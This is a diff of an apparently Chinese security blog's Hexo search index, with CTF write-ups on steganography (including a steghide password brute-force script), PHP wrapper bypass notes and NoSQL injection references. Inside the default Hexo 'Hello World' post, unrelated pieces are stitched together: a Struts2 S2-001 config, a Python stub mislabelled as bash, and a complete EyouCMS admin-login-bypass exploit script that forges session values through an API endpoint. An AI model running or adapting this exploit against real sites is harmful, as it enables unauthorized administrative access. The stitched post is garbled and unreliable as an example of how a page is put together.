@@ -4,6 +4,65 @@
   
     
     <entry>
+      <title>ClashforWindows_RCE</title>
+      <link href="//16107/"/>
+      <url>//16107/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tqlctf</title>
+      <link href="//56124/"/>
+      <url>//56124/</url>
+      
+        <content type="html"><![CDATA[<h2 id="TQLctf-2022-misc"><a href="#TQLctf-2022-misc" class="headerlink" title="[TQLctf 2022]misc"></a>[TQLctf 2022]misc</h2><h3 id="0x00-Misc-之-the-Ohio-State-University"><a href="#0x00-Misc-之-the-Ohio-State-University" class="headerlink" title="0x00 Misc 之 the Ohio State University"></a>0x00 Misc 之 the Ohio State University</h3><p> <a href="..........%5CDownloads%5Cf4f264ab75874ca2aa1f4b04dc0bb024(1).osz">f4f264ab75874ca2aa1f4b04dc0bb024(1).osz</a> </p><p>下载osu！ 软件解压 这个游戏类似节奏大师   压缩包里边是这段音乐</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220223234252050.png" alt="image-20220223234252050"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220223234323547.png" alt="image-20220223234323547"></p><p>音游 名字VVelcome！！</p><p>osz ⽂件实际上就是 zip ⽂件，修改后缀名解压即可获得背景图、⾳频、⾳效和铺⾯⽂件。<br>通过查看铺⾯⽂件，我们可以获得该铺⾯所对应的 ID，然后去 Osu! 官⽹下载官⽅的铺⾯进⾏对⽐，发现有四<br>个⽂件经过了修改。（或者可以直接看⽂件的修改⽇期）</p><ul><li>flag 的第⼀部分被加密在背景图⽚中，经过了 steghide 加密，密码在图⽚的属性内可被找到</li><li>flag 的第⼆部分被加密在 boom.wav 中，经过了 silenteye 加密，密码被写在 EASY 难度的铺⾯⽂件内</li><li>flag 的第三部分被隐藏在最⾼难度的铺⾯⽂件中，通过游戏内置的编辑器可以发现最后的尾杀部分被修改成了⼀串⽆理多押，将 Note 转为 0/1 再通过⼆进制的解读可以获得 flag（例如下图，从下往上从左往右读为 00110101，转为字符为 5，其他以此类推）</li></ul><p><strong>第一部分</strong>：kali安装 steghide 根据属性中密码提示得出flag</p><p>1.1</p><pre class="language-none"><code class="language-none">apt-get install steghide</code></pre><p>1.2查看是否有隐藏文件</p><pre class="language-none"><code class="language-none">steghide  info /home/kali/Desktop/200813_HEXADIVER.jpg //根据图片属性中的提示，猜测密码为：VVelcome!!</code></pre><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220223235220762.png" alt="image-20220223235220762"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220223235039272.png" alt="image-20220223235039272"></p><p>1.3 使用命令 将隐藏信息从载体中分离出来,得到flag1：TQLCTF{VVElcOM3 </p><pre class="language-none"><code class="language-none">steghide  extract -sf  /home/kali/Desktop/200813_HEXADIVER.jpg </code></pre><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220223235612725.png" alt="image-20220223235612725"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220223235319914.png" alt="image-20220223235319914"></p><p>1.4 steghide 使用方法总结</p><pre class="language-none"><code class="language-none">将secret.txt文件隐藏到text.jpg中：# steghide embed -cf test.jpg -ef secret.txt -p 123456从text.jpg解出secret.txt:#steghide extract -sf test.jpg -p 123456</code></pre><h2 id="Steghide爆破密码："><a href="#Steghide爆破密码：" class="headerlink" title="Steghide爆破密码："></a>Steghide爆破密码：</h2><pre class="language-none"><code class="language-none">#bruteStegHide.sh #!/bin/bashfor line in `cat $2`;do    steghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1    if [[ $? -eq 0 ]];then        echo 'password is: '$line        exit    fi  done </code></pre><p>用法：<br> # ./bruteStegHide.sh test.jpg passwd.txt<br> 效果： </p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220224003728367.png" alt="image-20220224003728367"></p><p>参考链接：<a href="http://www.javashuo.com/article/p-barvfmbp-gx.html"></a></p><p>未完 待续</p><h3 id="1-3-pug模板注入基础"><a href="#1-3-pug模板注入基础" class="headerlink" title="1.3  pug模板注入基础"></a>1.3  pug模板注入基础</h3><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql注入 总结 (kin9yh)</a></p><h2 id="0x02解题思路"><a href="#0x02解题思路" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h2><p>注册登录后发现自己注册的账户not active</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20211216144117735.png" alt="image-20211216144117735"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20211216144117735.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220303235725549.png" alt="image-20220303235725549"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220303235725549.png"></p><p>查看源码</p><p>参考链接：<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">Nosql 注入从零到一</a></p><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql 总结 (kin9yh)</a></p><p>参考链接：<a href="https://www.getflag.cn/2021/09/20/2021RCTF%20%E5%A4%8D%E7%8E%B0%20by%20kawhi/">kawhi’s Blog rctf复现</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> ctf </tag>
+            
+            <tag> TQLctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>山石网科2022冬令营_web</title>
+      <link href="//20054/"/>
+      <url>//20054/</url>
+      
+        <content type="html"><![CDATA[<ul><li><strong>从0到1学习OGNL沙箱绕过思路——V1ntlyn</strong></li><li><strong>浅谈php伪协议——th1e</strong></li><li><strong>LFI演化史——HhhM</strong></li></ul><p><strong>浅谈php伪协议——th1e</strong></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117101817180.png" alt="image-20220117101817180"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117101846412.png" alt="image-20220117101846412"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117101953328.png" alt="image-20220117101953328"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102019718.png" alt="image-20220117102019718"></p><p>php为协议冷门的封装器</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102121423.png" alt="image-20220117102121423"></p><p>php：//stdin 打开后，只能关闭其副本</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102329395.png" alt="image-20220117102329395"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102413338.png" alt="image-20220117102413338"></p><p>out与echo的实现方法一样</p><p>err</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102510331.png" alt="image-20220117102510331"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102529348.png" alt="image-20220117102529348"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117102911878.png" alt="image-20220117102911878"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117103055959.png" alt="image-20220117103055959"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117103342642.png" alt="image-20220117103342642"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117103352029.png" alt="image-20220117103352029"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117103559538.png" alt="image-20220117103559538"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117103637715.png" alt="image-20220117103637715"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117103647579.png" alt="image-20220117103647579"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104123407.png" alt="image-20220117104123407"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104159746.png" alt="image-20220117104159746"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104231514.png" alt="image-20220117104231514"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104254130.png" alt="image-20220117104254130"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104450002.png" alt="image-20220117104450002"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104548548.png" alt="image-20220117104548548"></p><p>filter协议写入</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104605566.png" alt="image-20220117104605566"></p><p>base64绕过</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104703182.png" alt="image-20220117104703182"></p><p>rot13绕过</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117104926540.png" alt="image-20220117104926540"></p><p>toupper 大写字符串</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117105142304.png" alt="image-20220117105142304"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117105152767.png" alt="image-20220117105152767"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117105210791.png" alt="image-20220117105210791"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117105236862.png" alt="image-20220117105236862"></p><p>文件名与内容 是否相同</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117105333049.png" alt="image-20220117105333049"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117110148779.png"></p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117110306340.png" alt="image-20220117110306340"></p><p>所以需要先闭合</p><p>当没有权限访问刚创建的文件时使用/../回退</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20220117110513687.png" alt="image-20220117110513687"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> ctf </tag>
+            
+            <tag> 山石网科冬令营_web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>test</title>
       <link href="//63534/"/>
       <url>//63534/</url>
@@ -186,56 +245,6 @@
     
     
     <entry>
-      <title>Nosql注入总结</title>
-      <link href="//7364/"/>
-      <url>//7364/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      <categories>
-          
-          <category> WEB安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Nosql注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Rctf_Web_CandyShop</title>
-      <link href="//13619/"/>
-      <url>//13619/</url>
-      
-        <content type="html"><![CDATA[<p>Buy some sweet candies online?<br>环境每10分钟重启一次/The container will be restarted every 10 minutes<br><a href="http://81.71.119.8:3000/">http://81.71.119.8:3000/</a></p><p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/dda6eaf3c5ad4091b174623e32a927f7.zip">点击下载附件 1</a></p><h2 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h2><h3 id="1-1-javaScript-基础"><a href="#1-1-javaScript-基础" class="headerlink" title="1.1 javaScript 基础"></a>1.1 javaScript 基础</h3><p><strong>let</strong> ：声明的变量只在 let 命令所在的代码块内有效。</p><p><strong>forEach() 方法</strong>：用于调用数组的每个元素，并将元素传递给回调函数。</p><pre class="language-none"><code class="language-none">本质上等同于 for 循环，对每一项执行 function 函数。即map是返回一个新数组，原数组不变，forEach 是改变原数组。</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"> <span class="token keyword">var</span> array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Array在ES5新增的方法中，参数都是function类型，默认有传参，forEach方法中的function回调支持3个参数，第1个是遍历的数组内容；第2个是对应的数组索引，第3个是数组本身</span>array<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span>index<span class="token punctuation">,</span>data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">++</span>value<span class="token punctuation">;</span><span class="token comment">//可以看出改变value的值，数组本身是没有改变的</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"value:"</span><span class="token punctuation">,</span>value<span class="token punctuation">,</span><span class="token string">"index:"</span><span class="token punctuation">,</span>index<span class="token punctuation">,</span><span class="token string">"data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出结果</span>    <span class="token comment">// value: 2 index: 0 data: (3) [1, 2, 3]</span>    <span class="token comment">// value: 3 index: 1 data: (3) [1, 2, 3]</span>    <span class="token comment">// value: 4 index: 2 data: (3) [1, 2, 3]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token string">"array"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出结果</span><span class="token comment">// [1, 2, 3] "array"</span></code></pre><h3 id="1-2-Nosql注入基础"><a href="#1-2-Nosql注入基础" class="headerlink" title="1.2 Nosql注入基础"></a>1.2 Nosql注入基础</h3><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql注入 总结 (kin9yh)</a></p><h3 id="1-3-pug模板注入基础"><a href="#1-3-pug模板注入基础" class="headerlink" title="1.3  pug模板注入基础"></a>1.3  pug模板注入基础</h3><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql注入 总结 (kin9yh)</a></p><h2 id="0x02解题思路"><a href="#0x02解题思路" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h2><p>注册登录后发现自己注册的账户not active</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20211216144117735.png" alt="image-20211216144117735"></p><p>查看源码</p><p>参考链接：<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">Nosql 注入从零到一</a></p><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql 总结 (kin9yh)</a></p><p>参考链接：<a href="https://www.getflag.cn/2021/09/20/2021RCTF%20%E5%A4%8D%E7%8E%B0%20by%20kawhi/">kawhi’s Blog rctf复现</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Rctf(2021) </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>终端安全技术趋势</title>
       <link href="//39374/"/>
       <url>//39374/</url>
@@ -287,6 +296,56 @@
         <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">&gt;</span></span>S2-001 Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>struts2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">&gt;</span></span>org.apache.struts2.dispatcher.FilterDispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>struts2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">&gt;</span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">&gt;</span></span></code></pre><p>$ hexo new “My New Post”</p><pre class="language-Python" data-language="Python"><code class="language-Python">from time import time,sleepimport requestsimport sysclass EyouCMS:    def __init__(self,URL):        self.Req = requests.session()        self.URL = URL        self.SleepTime = 0.5        self.AdminURL = 'login.php?m=admin&amp;c=Admin&amp;a=admin_edit&amp;id=1&amp;lang=cn'        self.Payload = 'index.php/?m=api&amp;c=ajax&amp;a=get_token&amp;name='        self.admin_id = 'admin_id'        self.admin_login_expire = 'admin_login_expire'        self.admin_info_role_id = 'admin_info.role_id'        self.Headers = {            'x-requested-with': 'XMLHttpRequest',        }    def Banner(self):        print("-"*10 + "后台登录绕过" + "-"*10)    def change(self,string):        temp = ''        for n, s in enumerate(string):            if n == 0:                if s.isalpha():                    return '0'                    break            if s.isdigit():                temp += str(s)            else:                if s.isalpha():                    break        return temp    def SetID(self):        res = self.Req.get(self.URL + self.Payload + self.admin_id, headers=self.Headers)        print("admin_id[+]:\t\t\t\t\t" + res.text)        if 'Set-cookie' in res.headers:            print(res.headers['set-cookie'])        if res.status_code != 200:            sys.exit("Api模块请求404")        # print(res.headers)    def SetExpire(self):        while True:            res = self.Req.get(self.URL + self.Payload + self.admin_login_expire, headers=self.Headers)           # print(res.text,end='\t\t\t\t')           # print(self.change(res.text))            if(time()-int(self.change(res.text),10)&lt;3600):                print("admin_login_expire[+]:\t\t\t" + res.text)                # print(res.headers)                break            sleep(self.SleepTime)    def SetRoleID(self):        while True:            res = self.Req.get(self.URL + self.Payload + self.admin_info_role_id, headers=self.Headers)            if(int(self.change(res.text),10)&lt;=0):                print("admin_info.rele_id[+]:\t\t\t" + res.text)                break            sleep(self.SleepTime)    def CheckLogin(self):        res = self.Req.get(self.URL + self.AdminURL, headers=self.Headers)        res.encoding = res.apparent_encoding        if '更换头像' in res.text:            print("OK")    def run(self):        self.SetID()        self.SetExpire()        self.SetRoleID()        self.CheckLogin()if __name__ == '__main__':    Start = time()    URL = 'http://10.12.246.7:20080/'    e = EyouCMS(URL)    e.run()    End = time()    print(End-Start)</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash"># encoding: utf-8# module typing.re# from (pre-generated)# by generator 1.147""" Wrapper namespace for re type aliases. """# no imports# functionsdef Match(*args, **kwargs): # real signature unknown    """    The central part of internal API.            This represents a generic version of type 'origin' with type arguments 'params'.        There are two kind of these aliases: user defined and special. The special ones        are wrappers around builtin collections and ABCs in collections.abc. These must        have 'name' always set. If 'inst' is False, then the alias can't be instantiated,        this is used by e.g. typing.List and typing.Dict.    """    passdef Pattern(*args, **kwargs): # real signature unknown    """    The central part of internal API.            This represents a generic version of type 'origin' with type arguments 'params'.        There are two kind of these aliases: user defined and special. The special ones        are wrappers around builtin collections and ABCs in collections.abc. These must        have 'name' always set. If 'inst' is False, then the alias can't be instantiated,        this is used by e.g. typing.List and typing.Dict.    """    pass# no classes# variables with complex values__all__ = [    'Pattern',    'Match',]__weakref__ = None # (!) real value is "&lt;attribute '__weakref__' of 'typing.re' objects&gt;"</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
       
       
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Nosql注入总结</title>
+      <link href="//7364/"/>
+      <url>//7364/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Nosql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Rctf_Web_CandyShop</title>
+      <link href="//13619/"/>
+      <url>//13619/</url>
+      
+        <content type="html"><![CDATA[<p>Buy some sweet candies online?<br>环境每10分钟重启一次/The container will be restarted every 10 minutes<br><a href="http://81.71.119.8:3000/">http://81.71.119.8:3000/</a></p><p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/dda6eaf3c5ad4091b174623e32a927f7.zip">点击下载附件 1</a></p><h2 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h2><h3 id="1-1-javaScript-基础"><a href="#1-1-javaScript-基础" class="headerlink" title="1.1 javaScript 基础"></a>1.1 javaScript 基础</h3><p><strong>let</strong> ：声明的变量只在 let 命令所在的代码块内有效。</p><p><strong>forEach() 方法</strong>：用于调用数组的每个元素，并将元素传递给回调函数。</p><pre class="language-none"><code class="language-none">本质上等同于 for 循环，对每一项执行 function 函数。即map是返回一个新数组，原数组不变，forEach 是改变原数组。</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"> <span class="token keyword">var</span> array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Array在ES5新增的方法中，参数都是function类型，默认有传参，forEach方法中的function回调支持3个参数，第1个是遍历的数组内容；第2个是对应的数组索引，第3个是数组本身</span>array<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span>index<span class="token punctuation">,</span>data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">++</span>value<span class="token punctuation">;</span><span class="token comment">//可以看出改变value的值，数组本身是没有改变的</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"value:"</span><span class="token punctuation">,</span>value<span class="token punctuation">,</span><span class="token string">"index:"</span><span class="token punctuation">,</span>index<span class="token punctuation">,</span><span class="token string">"data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出结果</span>    <span class="token comment">// value: 2 index: 0 data: (3) [1, 2, 3]</span>    <span class="token comment">// value: 3 index: 1 data: (3) [1, 2, 3]</span>    <span class="token comment">// value: 4 index: 2 data: (3) [1, 2, 3]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token string">"array"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出结果</span><span class="token comment">// [1, 2, 3] "array"</span></code></pre><h3 id="1-2-Nosql注入基础"><a href="#1-2-Nosql注入基础" class="headerlink" title="1.2 Nosql注入基础"></a>1.2 Nosql注入基础</h3><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql注入 总结 (kin9yh)</a></p><h3 id="1-3-pug模板注入基础"><a href="#1-3-pug模板注入基础" class="headerlink" title="1.3  pug模板注入基础"></a>1.3  pug模板注入基础</h3><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql注入 总结 (kin9yh)</a></p><h2 id="0x02解题思路"><a href="#0x02解题思路" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h2><p>注册登录后发现自己注册的账户not active</p><p><img src="https://raw.githubusercontent.com/kin9yh/TuChuang/master/img/image-20211216144117735.png" alt="image-20211216144117735"></p><p>查看源码</p><p>参考链接：<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">Nosql 注入从零到一</a></p><p>参考链接：<a href="https://kin9yh.github.io/7364/">Nosql 总结 (kin9yh)</a></p><p>参考链接：<a href="https://www.getflag.cn/2021/09/20/2021RCTF%20%E5%A4%8D%E7%8E%B0%20by%20kawhi/">kawhi’s Blog rctf复现</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Rctf(2021) </tag>
+            
+        </tags>
       
     </entry>
     
